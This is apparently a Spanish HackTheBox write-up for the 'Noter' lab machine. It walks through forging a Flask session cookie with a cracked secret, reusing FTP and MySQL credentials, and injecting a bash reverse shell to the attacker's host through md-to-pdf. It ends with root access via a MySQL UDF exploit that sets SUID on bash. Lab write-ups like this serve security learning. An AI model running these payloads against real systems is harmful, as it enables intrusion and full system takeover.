---
title: WriteUp Noter HTB
author: rabb1t
date: 2022-09-02
categories: [HackTheBox, WriteUp, Machines, Linux]
tags: [ftp, flask-unsing, JWT, CVE-2021-23639, UDF library]
math: false
mermaid: false
image:
  path: https://www.hackthebox.com/storage/avatars/ea85ecc8e550a6997195e9a75a12ca73.png
  width: 180
  height: 180
---

## Índice
- [Información básica de la máquina](#máquina-noter)
- [Herramientas y recursos empleados](#herramientas-y-recursos-empleados)
- [Fase de enumeración](#fase-de-enumeración)
	- [Enumerando usuarios](#enumerando-usuarios)
- [¿Tienes algún secreto?](#tienes-algún-secreto)
- [Accediendo a ftp como blue](#accediendo-a-ftp-como-blue)
- [Accediendo a ftp como ftp_admin](#accediendo-a-ftp-como-ftp_admin)
- [¿Hay algo o alguien aquí?](#hay-algo-o-alguien-aquí)
- [Escalando privilegios](#escalando-privilegios)
## Máquina Noter

| IP     	   |10.10.11.160|
|--------------|------------|
| OS		   | Linux		|
| Dificultad   | Media      |
| Creador	   | kavigihan	|

## Herramientas y recursos empleados
- Herramientas
	- nmap
	- wfuzz
	- flask-unsign
	- ftp
	- netcat
- Recursos
	- hacktricks
	- SecLists

## Fase de enumeración
Iniciamos con un escaneo de todos los puertos abiertos y la detección de servicios para los mismos:
```shell
rabb1t@hold:~$ nmap -sCV -oN scope.txt 10.10.11.160
Nmap scan report for 10.10.11.160
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Tenemos el puerto 21 (ftp), 22 (SSH) y 5000 (http), al parecer usando python con `Werkzeug`.
Intentemos conectarnos a través de `ftp` como `anonymous` con una contraseña vacía:
```shell
rabb1t@hold:~$ ftp 10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:$(USER)): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed.
```

No podemos acceder, necesitamos credenciales. 
Tampoco tenemos credenciales para conectarnos por SSH, así que de momento lo dejamos y vamos a por el siguiente servicio, el puerto 5000.

Vamos a nuestro navegador favorito y ponemos `http://10.10.11.160:5000` para realizar la búsqueda. Observamos lo siguiente: 

![Web Noter](/assets/favicon/2022-09-03/noter1.png)

Es una web para guardar notas. Podemos intentar credenciales por defecto en `Login` como:

- admin:admin
- administrator:administrator
- guest:guest

Sin embargo, ninguna funciona. Así que vamos a registrarnos para tener un poco más de alcance:
![Login Web Noter](/assets/favicon/2022-09-03/noter2.png)

Bueno, vemos que podemos hacer varias cosas, entre ellas: ver nuestras notas y comprar una membresía VIP. También vemos algo interesante: el usuario con el cual ingresamos, se refleja en el dashboard, por lo que podríamos pensar en `SSTI` —ya os digo que no sucede nada si hacemos pruebas en el usuario, en el título de las notas ni en el cuerpo de las notas—. 
Inspeccionando un poco más, nos encontramos algo con lo que podemos jugar: un __JWT (Json Web Token)__ guardado en las cookies de nuestra sesión:
![JWT Web Noter](/assets/favicon/2022-09-03/noter3.png)

> eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU

Veamos qué contiene al pasarlo a esta [web](https://jwt.io/) o también podemos decodear la primer parte del Token desde consola:
```shell
rabb1t@hold:~$ echo 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9' | base64 -d | jq

{
  "logged_in": true,
  "username": "test123"
}
```
> En la web tenemos más datos como el tipo de cifrado `HMACSHA256`
{: .prompt-info}

## Enumerando usuarios
Anteriormente en el intento de acceder usando credenciales por defecto, vimos el mensaje de error `Invalid credentials`. Cuando usamos el usuario que registramos (`test123`) con una contraseña errónea, aparece el mensaje `Ìnvalid login`, así que tenemos una vía potencial de enumerar usuarios. Denodo a lo anterior usaré `wfuzz` —también podríamos crear un script en python para el mismo fin—:

```shell
rabb1t@hold:~$ wfuzz -c --ss 'Invalid login' -w /usr/share/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.160:5000/login
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.160:5000/login
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                   
=====================================================================

000001208:   200        68 L     110 W      2027 Ch     "blue" 
```

- \-c: salida con colores
- \-\-ss: show regex
- \-w: diccionario
- \-d: datos
- \-H: cabecera

## ¿Tienes algún secreto?
El formato de datos lo podemos ver en la petición que mandamos al intentar ingresar con un usuario y contraseña desde el navegador.
Lo importante: obtuvimos un usuario, `blue` ¿Y ahora qué? Bueno, haciendo una búsqueda por internet o más bien en la "Biblia", [hacktricks](https://book.hacktricks.xyz), nos encontramos con algo que nos puede ayudar a [crackear](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) el `secreto` del `JWT`:

```shell
rabb1t@hold:~$ flask-unsign --wordlist /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU' --no-literal-eval
[*] Session decodes to: {'logged_in': True, 'username': 'test123'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 18048 attempts
b'secret123'
```

Ahora que tenemos el secreto `secret123`, podemos construir nuestro propio `JWT` para conectarnos con el usuario `blue`:
```shell
rabb1t@hold:~$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YxEq4Q.mqsQtRYlhrqrq2hkn604WPY2PLY
```

Cambiamos en el navegador la cookie que teníamos por la que hemos construido y accedemos. Al entrar a la sesión vemos que tiene `VIP` —con un usuario normal no la teníamos—. Además, observamos que hay dos notas, y una de ellas es 'Noter Premium Membership' en la que encontramos lo siguiente:

> Written by ftp_admin on Mon Dec 20 01:52:32 2021
Hello, Thank you for choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.  
(Additional information are included in the attachments we sent along the
Email)  
We all hope you enjoy our service. Thanks!  
ftp_admin

## Accediendo a ftp como blue
¡Ahora tenemos credenciales para acceder por ftp! Cuando accedemos obtenemos lo siguiente:
```shell
rabb1t@hold:~$ ftp 10.10.11.160 
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:$(USER)): blue
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        1002         4096 May 02 23:05 .
drwxr-xr-x    3 0        1002         4096 May 02 23:05 ..
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
ftp>
```
> El archivo PDF nos dice la política que se emplea para las contraseñas `username@site_name!`.
{: .prompt-info}

## Accediendo a ftp como ftp_admin
Sabiendo lo anterior, podemos intentar acceder como el usuario `admin` siguiendo la política:
```shell
rabb1t@hold:~$ ftp 10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:rabb1t0xf): ftp_admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        1003         4096 May 02 23:05 .
drwxr-xr-x    2 0        1003         4096 May 02 23:05 ..
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
```
> contraseña: `ftp_admin@Noter!`
{: .prompt-info}

¡Obtuvimos acceso! Además hay dos backups. Sin rechistar los descargamos:
```shell
ftp> get app_backup_1635803546.zip app1.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).
226 Transfer complete.
25559 bytes received in 0,286 seconds (87,3 kbytes/s)
ftp> get app_backup_1638395546.zip app2.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).
226 Transfer complete.
26298 bytes received in 0,28 seconds (91,9 kbytes/s)
ftp> quit
221 Goodbye.
```

## ¿Hay algo o alguien aquí?
Revisando los archivos, nos encontramos con credenciales para la base de datos MySQL:
```python
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
```

Como no tenemos acceso al sistema, debemos pensar en meternos...
Dentro de uno de los archivos `app.py` vemos dos funciones que están usando el ejecutable `/bin/bash`:
```python
def export_note_local(id):
	if check_VIP(session['username']):
		cur = mysql.connection.cursor()
 
        result = cur.execute("SELECT * FROM notes WHERE id = %s and author = %s", (id,session['username']))
 
        if result > 0:
	        note = cur.fetchone()
 
            rand_int = random.randint(1,10000)
            command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
            subprocess.run(command, shell=True, executable="/bin/bash")
         
            return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)
 
        else:
            return render_template('dashboard.html')
    else:
        abort(403)
 
# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
	if check_VIP(session['username']):
	    try:
	        url = request.form['url']
 
            status, error = parse_url(url)
 
            if (status is True) and (error is None):
                try:
	                r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")
 
	                if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):
 
		                return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)
 
                     else:
		                 return render_template('export_note.html', error="Error occured while exporting the !")
 
				 except Exception as e:
	                return render_template('export_note.html', error="Error occured!")
 
 
             else:
                 return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")
             
         except Exception as e:
	         return render_template('export_note.html', error=f"Error occured while exporting ! ({e})")
 
	else:
	    abort(403)
```

Además, vemos que `md-to-pdf.js` se ejecuta con _NodeJS_. Haciendo una búsqueda por internet nos encontramos una [vulnerabilidad](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) que podríamos probar en la sección de la web _Export Notes_ que se otorga solamente para usuarios 'VIP':
![Export Notes Noter ](/assets/favicon/2022-09-03/noter4.png)

Creamos un archivo malicioso:
```shell
rabb1t@hold:~$ echo "--';bash -i >& /dev/tcp/10.10.14.44/4433 0>&1;'--" > rev.md 
```

Levantamos un servidor con python:
```shell
rabb1t@hold:~$ python3 -m http.server
```
Y en otra ventana debemos ponernos en "escucha" con `netcat` en el puerto que específicamos dentro del archivo malicioso, `4433`:
```shell
rabb1t@hold:~$ netcat -lnvp 4433
```

Y en el campo _URL_ ponemos lo siguiente `http://10.10.14.44:8000/rev.md` (que es nuestra IP, el puerto del servidor y el archivo malicioso, respectivamente). Presionamos en `exportar` y obtenemos una conexión remota: 
```shell
rabb1t@hold:~$ netcat -lnvp 4433
Listening on 0.0.0.0 4433
Connection received on 10.10.11.160 49170
bash: cannot set terminal process group (1261): Inappropriate ioctl for device
bash: no job control in this shell
svc@noter:~/app/web$
```

## Escalando privilegios
Después de hacer una enumeración básica, no encontramos nada de lo que nos podamos aprovechar.
Recordemos que tenemos credenciales para conectarnos a la base de datos. Hay una técnica de [escalada](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library) de privilegios mediante `MySQL` que podemos probar usando [este exploit](https://www.exploit-db.com/exploits/1518), subiendo el archivo a la máquina víctima y haciendo lo siguiente:

```shell
svc@noter:~/tmp$ gcc -g -c raptor_udf2.c
svc@noter:~/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
svc@noter:~/tmp$ mysql -u 'root' -p'Nildogg36'

MariaDB [(none)]> use mysql;
Database changed

MariaDB [mysql]> create table test(line blob);
Query OK, 0 rows affected

MariaDB [mysql]> insert into test values(load_file('/home/tmp/raptor_udf2.so'));
Query OK, 1 row affected

MariaDB [mysql]> select * from test into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
Query OK, 1 row affected

MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected

MariaDB [mysql]> select do_system('chmod u+s /bin/bash');
+----------------------------------+
| do_system('chmod u+s /bin/bash') |
+----------------------------------+
|                                0 |
+----------------------------------+

MariaDB [mysql]> exit
Bye
```

Ejecutamos el binario `bash` con privilegios (`-p`) y nos convertimos en `root`:
```shell
svc@noter:~/tmp$ /bin/bash -p
bash-5.0\# whoami
root
bash-5.0#
```

¡Happy Hacking!